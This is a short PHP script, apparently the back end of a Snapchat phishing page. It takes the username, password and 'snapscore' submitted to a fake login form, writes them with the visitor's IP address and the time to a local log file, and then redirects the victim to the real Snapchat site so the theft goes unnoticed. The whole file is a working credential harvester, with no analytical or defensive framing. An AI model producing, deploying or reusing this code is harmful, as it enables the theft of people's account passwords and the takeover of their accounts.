<?php
$logfile = 'log.txt';
$ip = $_SERVER['REMOTE_ADDR'];
$time = date('Y-m-d H:i:s');
$username = $_POST['username'];
$password = $_POST['password'];
$snapscore = $_POST['snapscore'];

$data = "IP: $ip - Time: $time - Username: $username - Password: $password - SnapScore: $snapscore\n";
file_put_contents($logfile, $data, FILE_APPEND);

// Redirect to the real Snapchat login page
header('Location: https://www.snapchat.com/');
exit();
?>
